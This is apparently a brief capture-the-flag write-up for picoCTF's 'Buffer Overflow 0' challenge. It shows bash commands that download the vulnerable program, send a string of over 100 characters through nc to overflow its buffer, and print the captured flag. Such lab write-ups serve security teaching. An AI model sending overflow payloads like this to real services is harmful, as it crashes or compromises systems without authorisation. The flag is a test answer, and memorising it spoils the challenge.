# Buffer Overflow 0

## Steps
```bash
wget https://artifacts.picoctf.net/c/173/vuln https://artifacts.picoctf.net/c/173/vuln.c

# get told how to connect
nc saturn.picoctf.net 53154

# run it, see it takes an input, check the vuln.c for what size the buffers are

# see that char buf1[100]; so pump in a payload >100 bytes
payload=""
for b in {0..100}; do payload="${payload}x"; done

# pump payload into nc and hope it dies
echo $payload | nc saturn.picoctf.net 53154
```

## Flag
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```
